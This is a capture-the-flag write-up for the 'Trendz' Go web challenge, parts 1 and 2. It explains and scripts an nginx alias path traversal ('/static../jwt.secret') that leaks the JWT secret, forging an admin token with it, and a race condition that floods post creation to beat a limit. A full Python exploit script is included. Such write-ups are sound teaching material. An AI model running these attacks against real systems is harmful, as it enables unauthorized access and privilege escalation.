+++
title = 'Trendz'
tags = [
  "Web",
  "Jwt secret leak",
  "Race condition",
  "383 points",
  "175 points",
  "52 solves",
  "86 solves",
  "careless_finch",
]
date = 2024-09-02T10:59:04+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Trendz (part 1 & 2)</h1>

## Preamble

This challenge is divided into four parts, three webs and a reverse. I'm excited to share that I managed to solve the first two webs! I'll insert them all in a write-up, trying to explain them in the way the author thought. I admit I did not solve them in order, but I'm eager to see how they fit together.
The application was written in Go using templates and a JWT authentication, and it's write well! The application itself has many files, but they are well written and ordered, so a thorough analysis is not difficult but necessary. The application is divided into 5 basic parts.

- **Config file**: `ngix.conf` ,`run.sh`,`init.sql`, `dockerfile` and `.dockerignore`
- **Main go file**: `main.go` This is where you'll find all the details about how to use the different functions and what they do!
- **Dashboard**: Here are the 3 types of dashboards possible in the application
- **Jwt handler**: How to use JWT for authentication.
- **Service**: The various services such as post creation or user validation

## Application flow

The basic application is presented with a login/registration screen where once we are logged in we are assigned an accesstoken and a refreshtoken, a redirect to the standard user dashboard occurs where we can create posts and view them via `/posts/post-id`,basically more than this we cannot do

![alt text](/images/trendz/image.png)
![alt text](/images/trendz/image-1.png)

## Path structure

As mentioned before in the main.go we find the path declaration and some very important initialization functions

```go
// filename: main.go

func main() {
 s := gin.Default()
 s.LoadHTMLGlob("templates/*")
 db.InitDBconn()
 jwt.InitJWT() // Initialization of jwt we will analyze it later

 s.GET("/", func(c *gin.Context) {
  c.Redirect(302, "/login")
 })
 s.GET("/ping", func(c *gin.Context) {
  c.JSON(200, gin.H{
   "message": "pong",
  })
 })
 r := s.Group("/")
 r.POST("/register", service.CreateUser)
 r.GET("/register", func(c *gin.Context) {
  c.HTML(200, "register.tmpl", gin.H{})
 })
 r.POST("/login", service.LoginUser)
 r.GET("/login", func(c *gin.Context) {
  c.HTML(200, "login.tmpl", gin.H{})
 })

 r.GET("/getAccessToken", service.GenerateAccessToken)

 authorizedEndpoints := r.Group("/user")
 authorizedEndpoints.Use(service.AuthorizeAccessToken())
 authorizedEndpoints.GET("/dashboard", dashboard.UserDashboard)
 authorizedEndpoints.POST("/posts/create", service.CreatePost)
 authorizedEndpoints.GET("/posts/:postid", service.ShowPost)
 authorizedEndpoints.GET("/flag", service.DisplayFlag)

 adminEndpoints := r.Group("/admin")
 adminEndpoints.Use(service.AuthorizeAccessToken())
 adminEndpoints.Use(service.ValidateAdmin())
 adminEndpoints.GET("/dashboard", dashboard.AdminDashboard)

 SAEndpoints := r.Group("/superadmin")
 SAEndpoints.Use(service.AuthorizeAccessToken())
 SAEndpoints.Use(service.ValidateAdmin())
 SAEndpoints.Use(service.AuthorizeRefreshToken())
 SAEndpoints.Use(service.ValidateSuperAdmin())
 SAEndpoints.GET("/viewpost/:postid", dashboard.ViewPosts)
 SAEndpoints.GET("/dashboard", dashboard.SuperAdminDashboard)
 s.NoRoute(custom.Custom404Handler)
 s.Run(":8000")
}

```

As it is seen the scheme of the paths is very clear and it is well done basically we have the login and registration and then we move to a division by `role` where we have a user section an admin and a superadmin each of them with their own validation services

## Config files

```bash
# filename: run.sh

#!/bin/env sh
cat /dev/urandom | head | sha1sum | cut -d " " -f 1 > /app/jwt.secret

export JWT_SECRET_KEY=notsosecurekey
export ADMIN_FLAG=CSCTF{flag1}
export POST_FLAG=CSCTF{flag2}
export SUPERADMIN_FLAG=CSCTF{flag3}
export REV_FLAG=CSCTF{flag4}
export POSTGRES_USER=postgres
export POSTGRES_PASSWORD=mysecretpassword
export POSTGRES_DB=devdb

uuid=$(cat /proc/sys/kernel/random/uuid)
user=$(cat /dev/urandom | head | md5sum | cut -d " " -f 1)
cat << EOF >> /docker-entrypoint-initdb.d/init.sql
 INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin');
    INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG');
EOF

docker-ensure-initdb.sh &
GIN_MODE=release /app/chall & sleep 5
su postgres -c "postgres -D /var/lib/postgresql/data" &

nginx -g 'daemon off;'

```

This file is actually very important because it gives us an idea of where the flags are (which fortunately are also numbered)

As we see the first thing that is done is to create a file called jwt.secret that will be a source of interest later,

We see that another jwt secret is initialized and 4 flags in 4 different environment variables,

Queries are made one in which the superadmin user is created and another in which the flag is inserted in a record in the posts table

Finally, the postgree database and the ngix server are started.

```json

user  nobody;
worker_processes  auto;

events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
        location / {
            proxy_pass http://localhost:8000;
        }
        location /static {
            alias /app/static/;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }

    }

}

```

This is the ngix configuration, where a fairly standard configuration is written, except for declaring a `/static` alias.

Well, once I've finished presenting the application, I'd say you're ready to go...

---

# Trendz Part 1

**Description**: The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.

> Note: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you've completed this initial task, and will be released in Wave 3.

## Introduction

Well, as we saw in the run.sh file, the first flag is inside a record in the post table and it is also called ADMIN_FLAG, so the first thing to see is how admin authentication works and what the admin dashboard can do.

## Source

```go
// filename: AdminDash.go

package dashboard

import (
 "app/handlers/service"
 "os"

 "github.com/gin-gonic/gin"
)

func AdminDashboard(ctx *gin.Context) {
 posts := service.GetAllPosts()
 ctx.HTML(200, "adminDash.tmpl", gin.H{
  "flag":  os.Getenv("ADMIN_FLAG"),
  "posts": posts,
 })
}
```

As we can see, the dashboard is very concise, we simply see that the `GetAllPosts()` function is called and then they are sent to the template, so not much to do here, let's move on to how the admin is authenticated.

```go
//filename: main.go

adminEndpoints := r.Group("/admin")
adminEndpoints.Use(service.AuthorizeAccessToken())
adminEndpoints.Use(service.ValidateAdmin())
adminEndpoints.GET("/dashboard", dashboard.AdminDashboard)
```

As we can see from the code, whenever we try to connect to the admin dashboard, it first runs two functions, `ValidateAccess()` and `ValidateAdmin()`.

```go
//filename: JWTHandler.go

func AuthorizeAccessToken() gin.HandlerFunc {
 return func(c *gin.Context) {
  c.Header("X-Frame-Options", "DENY")
  c.Header("X-XSS-Protection", "1; mode=block")
  const bearerSchema = "Bearer "
  var tokenDetected bool = false
  var tokenString string
  authHeader := c.GetHeader("Authorization")
  if len(authHeader) != 0 {
   tokenDetected = true
   tokenString = authHeader[len(bearerSchema):]
  }
  if !tokenDetected {
   var err error
   tokenString, err = c.Cookie("accesstoken")
   if tokenString == "" || err != nil {
    c.Redirect(302, "/getAccessToken?redirect="+c.Request.URL.Path)
   }
  }
  fmt.Println(tokenString)
  token, err := jwt.ValidateAccessToken(tokenString)
  if err != nil {
   fmt.Println(err)
   c.AbortWithStatus(403)
  }
  if token.Valid {
   claims := jwt.GetClaims(token)
   fmt.Println(claims)
   c.Set("username", claims["username"])
   c.Set("role", claims["role"])
  } else {
   fmt.Println("Token is not valid")
   c.Header("HX-Redirect", "/getAccessToken")
   c.AbortWithStatus(403)
  }
 }
}
```

This is a pretty standard function regarding JWT integrity checking, in fact here we see that the function checks that the cookie is well formatted and has no problems by validating it with the `ValidateAccessToken()` function, otherwise it rejects it or aborts the operation.

```go
//filename: JWTAuth.go

func ValidateAccessToken(encodedToken string) (*jwt.Token, error) {
 return jwt.Parse(encodedToken, func(token *jwt.Token) (interface{}, error) {
  _, isValid := token.Method.(*jwt.SigningMethodHMAC)
  if !isValid {
   return nil, fmt.Errorf("invalid token with signing method: %v", token.Header["alg"])
  }
  return []byte(secretKey), nil
 })
}

// The function is safe and it is not subject to `alg:none` or any other kind of attack, so we must move on.
```

```go
//filename: ValidateAdmin.go

func ValidateAdmin() gin.HandlerFunc {
 return func(c *gin.Context) {
  const bearerSchema = "Bearer "
  var tokenDetected bool = false
  var tokenString string
  authHeader := c.GetHeader("Authorization")
  if len(authHeader) != 0 {
   tokenDetected = true
   tokenString = authHeader[len(bearerSchema):]
  }
  if !tokenDetected {
   var err error
   tokenString, err = c.Cookie("accesstoken")
   if tokenString == "" || err != nil {
    c.Redirect(302, "/getAccessToken?redirect="+c.Request.URL.Path)
   }
  }
  fmt.Println(tokenString)
  claims := jwt.ExtractClaims(tokenString)
  if claims["role"] == "admin" || claims["role"] == "superadmin" {
   fmt.Println(claims)
  } else {
   fmt.Println("Token is not valid")
   c.AbortWithStatusJSON(403, gin.H{"error": "User Unauthorized"})
   return
  }
 }
}
```

Instead, we see here that the role is validated in the JWT by checking that it is at least admin or superadmin.

## Solution

Mmm authentication seems secure let's take a step back and go to the JWTInit function.

```go
//filename: JWTAuth.go

func InitJWT() {
 key, err := os.ReadFile("jwt.secret")
 if err != nil {
  panic(err)
 }
 secretKey = key[:]
 fmt.Printf("JWT initialized %v\n", secretKey)
}
```

We see that the function itself doesn't do much simply takes the key with which it will sign jwt's from a file well known to us in fact we have seen it in run.sh where it is created and where a secure value is put there

But if we analyse the Docker file system locally, we see that jwt.secret is located in the same folder as static, which we saw in the ngix configuration create an alias to that path.

```json
location /static {
            alias /app/static/;
        }
```

If we try to access /static we can see.

![alt text](/images/trendz/image-2.png)

NOTHING... But we can wander around a bit for js and css files that we don't need though, And if we try a class ../ after static we see that it doesn't find anything there

Hmm will there be a way to bypass the ngix and access the file?

Well actually yes because the configuration as we see on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx#alias-lfi-misconfiguration) is insecure and easily bypassed like this

![alt text](/images/trendz/image-3.png)

And if we try to type `/static../jwt.secret`... NICE WE GOT THE JWT SECRET

Now just change the role of the jwt and re-sign it but we'll see that later in detail being that the challenge itself is solved... **(At the end see the #PS)**

# Trendz Part 2

**Descripion**: Staying active has its rewards. There's a special gift waiting for you, but it's only available once you've made more than 12 posts. Keep posting to uncover the surprise!

> Note: Use the instancer and source from part one of this challenge, Trendz.

## Introduction

We are in the second part of the Trendz challenge, so we have exactly the same application, only the target flag has changed.

## Source

First thing to figure out is where the flag is located, going back to the run.sh we see that the file is located inside the `POST_FLAG` environment variable so we presso let's assume that the posts center something, searching the directories with grep or something else we see that the variable is called here:

```go
//filename: Posts.go

func DisplayFlag(ctx *gin.Context) {
 username := ctx.MustGet("username").(string)
 noOfPosts := CheckNoOfPosts(username)
 if noOfPosts <= 12 {

  ctx.JSON(200, gin.H{"error": fmt.Sprintf("You need %d more posts to view the flag", 12-noOfPosts)})
  return
 }
 ctx.JSON(200, gin.H{"flag": os.Getenv("POST_FLAG")})
}

```

Oh we just need to make 12 simple posts no?

Well not really in fact if we see the function that creates the posts we can see that it doesn't allow us to make more than 12

```go
//filename: Posts.go

func CreatePost(ctx *gin.Context) {
 username := ctx.MustGet("username").(string)
 noOfPosts := CheckNoOfPosts(username)
 var req struct {
  Title string `json:"title"`
  Data  string `json:"data"`
 }
 if err := ctx.BindJSON(&req); err != nil {
  ctx.JSON(400, gin.H{"error": "Invalid request"})
  fmt.Println(err)
  return
 }
 if noOfPosts >= 10 {
  ctx.JSON(200, gin.H{"error": "You have reached the maximum number of posts"})
  return
 }
 if len(req.Data) > 210 {
  ctx.JSON(200, gin.H{"error": "Data length should be less than 210 characters"})
  return
 }
 postID := InsertPost(username, req.Title, req.Data)
 ctx.JSON(200, gin.H{"postid": postID})
}

```

As we can see, a function is executed that checks the number of posts, which in itself is not a major problem, the problem lies in the misuse of this function.

This is because although go is very fast and even postgree actually this doesn't stop us from making a race condition

## Solution

The solution itself is very simple just create a large amount of requests simultaneously with the same session and hope to enter more posts than allowed by doing so we will be able to bypass the control and get our flag

> Probably the reason it works is much more precise and technical, but to tell you the truth, it came to me as soon as I saw it and tried it, and apparently my hunch was right...

## Final script

This is the final exploit script with the 2 challenge solution

```python
# filename: exploit.py
#!/usr/bin/python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import requests
import jwt
import string
import random

BASE_URL = "https://ID-INSTANCE.bugg.cc/"

s = requests.Session()

def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))


def login(username, password):
    response = s.post(f"{BASE_URL}/login",
                      json={"username": username, "password": password})
    if response.status_code != 200:
        print(f"Login failed: {response.status_code}")
        exit(response.status_code)


def register(username, password):
    response = s.post(f"{BASE_URL}/register",
                      json={"username": username, "password": password})
    if response.status_code != 200:
        print(f"Register failed: {response.status_code}")
        exit(response.status_code)

def logout():
    s.cookies.clear()

def create_post(title: str = "title", content: str = "content"):
    response = s.post(f"{BASE_URL}/user/posts/create",
                      json={"title": title, "data": content})
    if response.status_code != 200:
        print(f"Post creation failed: {response.status_code}")
        exit(response.status_code)


def run_tasks(num_tasks, concurrency_limit):
    results = []
    with ThreadPoolExecutor(max_workers=concurrency_limit) as executor:
        futures = [executor.submit(create_post)
                   for _ in range(num_tasks)]
        for future in as_completed(futures):
            results.append(future.result())

    return results

def download_secret():
  r = s.get(f"{BASE_URL}/static../jwt.secret", stream=True)
  with open("jwt.secret", "wb") as f:
      for chunk in r.iter_content(chunk_size=1024):
        f.write(chunk)

def resign_jwt(claims, secret_key):
    return jwt.encode(claims, secret_key, algorithm='HS256')

def get_flag_2():
    for _ in range(10):
        print("Try: " + str(_),end="\r")
        run_tasks(num_tasks=50,concurrency_limit=100)
        response = s.get(f"{BASE_URL}/user/flag")
        if "CSCTF{" in response.text:
            print("Flag 2 trendzz: " + response.json()['flag'])
            return True
        else:
            logout()
            username, password = random_string(10), random_string(10)
            register(username, password)
            login(username, password)
    return False

def get_flag_1():
    download_secret()

    with open("./jwt.secret", "rb") as file:
        key = file.read()

    print(f"Jwt secret leaked: {key}")

    original_token = s.cookies.get_dict().get("accesstoken")

    decoded_claims = jwt.decode(original_token, key, algorithms=['HS256'])

    decoded_claims['role'] = 'admin'

    new_jwt = resign_jwt(decoded_claims, key)

    s.cookies.update({"accesstoken": new_jwt})

    response = requests.get(f"{BASE_URL}/admin/dashboard",cookies={"accesstoken": new_jwt})

    soup = BeautifulSoup(response.text, 'html.parser')
    postid = soup.find_all('td')[1].text

    print(f"Post-id: {postid}")

    flag = s.get(f"{BASE_URL}/user/posts/{postid}").json().get("data")

    print("Flag 1 trendz: " + flag)

def main():
    print("Exploiting...")

    username, password = random_string(10), random_string(10)
    register(username, password)
    login(username, password)

    get_flag_1()

    if not get_flag_2():
        print("Flag 2 retrieval failed try again :(")

if __name__ == "__main__":
    main()
```

```stdout
$ flag 1: CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}
```

```stdout
$ flag 2: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}
```

##### PS:

> In the first flag I skipped a very funny part, in fact it is not enough to log in only as admin because we will not be shown the flag but a post of an ID that if you remember the flag was also in a precise record initialised in run.sh, if through /user/posts/post-id we view the post we can find the flag

<p align='right'>Author: akiidjk </p>
